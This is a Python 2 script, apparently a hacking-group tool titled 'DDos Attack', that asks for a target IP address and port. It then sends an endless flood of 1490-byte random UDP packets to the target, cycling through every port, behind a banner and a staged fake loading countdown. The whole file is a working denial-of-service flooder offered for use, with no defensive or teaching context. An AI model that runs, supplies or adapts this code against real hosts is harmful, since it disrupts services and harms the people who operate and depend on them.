import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print("Author   : DDOS ")
print("KURUCU   : Farquue ")
print("KURUCU   : Ashena ")
print("Sozumuz  : Biz Bir Orduyuz ")
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print("[Respect DDos Loading] 0% ")
time.sleep(10)
print("[Respect DDos Loading] 25%")
time.sleep(15)
print("[Respect DDos Loading] 50%")
time.sleep(25)
print("[Respect DDos Loading] 75%")
time.sleep(30)
print("[Respect DDos Loading] 100%")
time.sleep(35)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1